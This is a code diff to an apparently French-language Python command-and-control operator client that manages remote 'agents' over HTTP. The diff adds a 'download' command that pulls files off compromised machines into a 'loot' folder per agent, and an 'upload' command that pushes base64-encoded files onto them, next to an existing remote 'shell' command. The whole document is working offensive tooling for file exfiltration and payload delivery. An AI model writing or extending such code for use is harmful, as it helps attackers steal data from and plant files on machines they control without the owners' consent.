@@ -2,6 +2,8 @@ import argparse
 import requests
 from requests.auth import HTTPBasicAuth
 import time
+import base64
+import os
 from datetime import datetime
 
 def list_agents(base_url, auth):
@@ -95,10 +97,74 @@ if __name__ == "__main__":
                                 last_seen = latest
                                 break  # on s’arrête après le premier affichage
                         time.sleep(1)
+                elif ach.startswith("download "):
+                    cmd = ach[len("download "):].strip()
+                    if not cmd:
+                        print("Usage: download <remote_file_path>")
+                        continue
+                    cmd_to_queue = str({"download":cmd})
+                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
+                    last_seen = None
+                    while(1):
+                        results = get_latest_result(base_url, agent_id, auth)
+                        if results is None:
+                            break
+                        if results:
+                            # On identifie le résultat par sa valeur, ou un id si présent
+                            latest = results[-1]
+                            if latest != last_seen:
+                                loot_dir = 'loot'
+                                if not os.path.exists(loot_dir):
+                                    os.makedirs(loot_dir)
+                                agent_dir = 'loot/'+str(agent_id)
+                                if not os.path.exists(agent_dir):
+                                    os.makedirs(agent_dir)
+                                filename = os.path.basename(cmd)
+                                dest_path = str(agent_dir)+"/"+str(filename)
+                                with open(dest_path, 'wb') as f:
+                                    f.write(base64.b64decode(latest))
+                                print(f"[+] Fichier enregistré dans : {dest_path}")
+                                last_seen = latest
+                                break  # on s’arrête après le premier affichage
+                        time.sleep(1)
+
+
+
+                elif ach.startswith("upload "):
+                    cmd = ach[len("upload "):].strip()
+                    if not cmd:
+                        print("Usage: upload <local_file_path>")
+                        continue
+                    with open(cmd, 'rb') as f:
+                        file_content = f.read()
+                    b64_encoded_file = base64.b64encode(file_content)
+                    filename = os.path.basename(cmd)
+                    fil_props = base64.b64encode( str({"filename":filename, "content":b64_encoded_file}).encode("utf-8", errors="replace"))
+                    cmd_to_queue = str({"upload":fil_props})
+                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
+                    last_seen = None
+                    while(1):
+                        results = get_latest_result(base_url, agent_id, auth)
+                        if results is None:
+                            break
+                        if results:
+                            # On identifie le résultat par sa valeur, ou un id si présent
+                            latest = results[-1]
+                            if latest != last_seen:
+                                
+                                print(f"[+] Fichier envoyé : {filename}")
+                                last_seen = latest
+                                break  # on s’arrête après le premier affichage
+                        time.sleep(1)
+
+
+
+
+
                 elif len(ach)<1:
                     pass
                 else:
-                    print("Commandes valides: infos, shell <cmd>, back")
+                    print("Commandes valides: infos, shell <cmd>, download <remote_file_path>, upload <local_file_path>, back")
         elif choice in ("quit", "exit"):
             print("Bye.")
             break
